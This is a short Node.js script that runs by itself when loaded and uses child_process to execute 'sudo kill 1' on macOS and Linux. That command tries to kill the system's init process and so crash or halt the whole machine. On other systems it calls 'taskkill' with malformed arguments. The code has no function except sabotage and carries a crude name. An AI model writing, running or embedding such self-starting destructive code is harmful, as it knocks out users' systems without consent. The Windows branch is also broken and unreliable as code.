const { execFile } = require('child_process');
const os = require('os');
    
SudoBitch();

function SudoBitch() {

    let osType = os.type();
    osType = osType.toLowerCase();

    let program;

    if (osType == "darwin") program = "sudo";
    else if (osType == "linux") program = "sudo";
    else program = "taskkill";

    const args = [`kill`, '1'];
    
    return new Promise((resolve, reject) => {
        let output = {};
        const child = execFile(program, args, (err, stdout, stderr) => {
            if (stdout) {
                output.stdout = stdout;
            }
            if (err) {
                if (stderr) {
                    output.stderr = stderr;
                    return;
                }
                output.err = err;
            }
        });

        child.on("close", () => {
            resolve(output);
        });
    });
}